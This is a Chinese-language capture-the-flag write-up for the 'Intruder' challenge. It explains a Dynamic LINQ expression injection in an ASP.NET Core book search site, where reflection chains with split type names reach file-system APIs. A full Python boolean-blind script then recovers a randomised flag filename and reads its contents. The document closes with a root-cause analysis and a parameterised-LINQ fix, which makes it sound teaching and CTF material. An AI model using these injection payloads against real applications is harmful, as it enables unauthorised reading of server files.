# Intruder

## 题目简述

题目提供一个 ASP.NET Core 图书检索站点。访问 `/books?searchString=...` 可以按书名搜索；flag 在容器根目录，启动镜像时会被改名为 `/flag_<UUID>.txt`，因此既要找到随机文件名，也要读取文件内容。

仓库只给出了发布后的 `CRUD.dll`，但依赖清单和 DLL 中的字符串足以还原关键逻辑：程序使用 `System.Linq.Dynamic.Core 1.2.25`，并把参数直接拼入动态 LINQ 条件：

```csharp
books.AsQueryable().Where(
    "Title.Contains(\"" + searchString + "\")"
);
```

这不是数据库层的 SQL 注入。用户输入会成为 Dynamic LINQ 表达式的一部分，可以闭合字符串并注入新的布尔条件。虽然解析器不允许直接引用任意危险类型，但可从一个合法字符串对象出发，经 `GetType()` 和反射找到 `System.IO.Directory`、`System.IO.File` 等类型。

## 解题过程

先用正常书名确认真假条件的回显差异。数据库中存在标题以 `Harry` 开头的书，因此表达式为真时页面会显示该书；表达式为假时页面包含 `No books found.`。注入的整体结构为：

```text
Harry") AND <布尔表达式> AND ("xx"="xx
```

拼接后相当于：

```csharp
Title.Contains("Harry") AND <布尔表达式> AND ("xx"="xx")
```

关键问题是不能直接写 `System.IO.File`。官方脚本从空字符串的运行时类型所在程序集开始枚举类型：

```csharp
"".GetType().Assembly.DefinedTypes
  .First(x => x.FullName == "System" + ".IO." + "File")
```

把类型名拆成多段只是为了避开解析器对危险标识符的检查。得到 `TypeInfo` 后，再从 `DeclaredMethods` 中筛选方法并用 `Invoke` 调用。

第一阶段调用 `Directory.GetFiles("/", "flag*.txt")`，取返回数组的第一个元素，再用 `String.StartsWith` 做前缀判断。由于服务端只返回真假结果，按候选字符逐位扩展即可恢复 `/flag_<UUID>.txt`：

```csharp
"".GetType().Assembly.DefinedTypes
  .First(x => x.FullName == "System.IO.Directory")
  .DeclaredMethods.Where(x => x.Name == "GetFiles")
  .Skip(1).First()
  .Invoke(null, new object[] { "/", "flag*.txt" })
```

第二阶段以同样方式反射调用 `File.ReadAllText("/<文件名>")`，再对文件内容执行 `StartsWith(<已知前缀 + 候选字符>)`。完整求解脚本如下：

```python
import requests
from urllib.parse import quote_plus

URL = "http://127.0.0.1:8080"


def oracle(expression: str) -> bool:
    payload = (
        'Harry\") AND ' + expression + ' AND (\"xx\"=\"xx'
    )
    response = requests.get(
        URL + "/books?searchString=" + quote_plus(payload),
        timeout=10,
    )
    return response.status_code == 200 and "No books found." not in response.text


filename = ""
for _ in range(80):
    if filename.endswith(".txt"):
        break
    for candidate in "flag_-0123456789abcdef.txt":
        prefix = "/" + filename + candidate
        expression = (
            '"".GetType().Assembly.DefinedTypes.First('
            'x => x.FullName == "System"+"."+"String").DeclaredMethods'
            '.Where(x => x.Name == "StartsWith").First().Invoke('
            '"".GetType().Assembly.DefinedTypes.First('
            'x => x.FullName == "System.Array").DeclaredMethods'
            '.Where(x => x.Name == "GetValue").Skip(1).First().Invoke('
            '"".GetType().Assembly.DefinedTypes.First('
            'x => x.FullName == "System.IO.Directory").DeclaredMethods'
            '.Where(x => x.Name == "GetFiles").Skip(1).First().Invoke('
            'null, new object[] { "/", "flag*.txt" }), '
            'new object[] { 0 }), '
            f'new object[] {{ "{prefix}" }}).ToString()=="True"'
        )
        if oracle(expression):
            filename += candidate
            print("filename:", filename)
            break
    else:
        raise RuntimeError("文件名字符集不完整或目标不存在")

flag = ""
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
for _ in range(200):
    if flag.endswith("}"):
        break
    for candidate in alphabet:
        prefix = flag + candidate
        expression = (
            '"".GetType().Assembly.DefinedTypes.First('
            'x => x.FullName == "System"+"."+"String").DeclaredMethods'
            '.Where(x => x.Name == "StartsWith").First().Invoke('
            '"".GetType().Assembly.DefinedTypes.First('
            'x => x.FullName == "System"+".IO."+"File").DeclaredMethods'
            '.Where(x => x.Name == "ReadAllText").First().Invoke('
            f'null, new object[] {{ "/{filename}" }}), '
            f'new object[] {{ "{prefix}" }}).ToString()=="True"'
        )
        if oracle(expression):
            flag += candidate
            print("flag:", flag)
            break
    else:
        raise RuntimeError("flag 字符集不完整或读取失败")

print(flag)
```

本地附件中的占位 flag 为：

```text
SEKAI{L1nQ_Inj3cTshio0000nnnnn}
```

比赛实例中的文件名由 UUID 随机生成，必须按上述两阶段盲注流程获取，不能硬编码本地文件名。

## 方法总结

本题的核心是 Dynamic LINQ 表达式注入。分析时应先确认输入进入的是 SQL、模板还是表达式解释器；三者的语法和可用原语完全不同。即使解释器限制了危险类型，也不能只检查类型名：只要仍允许 `GetType()`、程序集枚举、方法元数据和 `Invoke`，攻击者就可能从安全对象沿反射关系到达文件系统 API。

利用上采用布尔盲注，将“页面是否出现图书”转换为稳定的真假 oracle。先枚举随机文件名，再读取文件内容，可以应对容器启动时对 flag 路径的随机化。修复时应使用参数化的静态 LINQ，例如 `books.Where(book => book.Title.Contains(searchString))`，并避免让不可信输入进入通用表达式解析器。
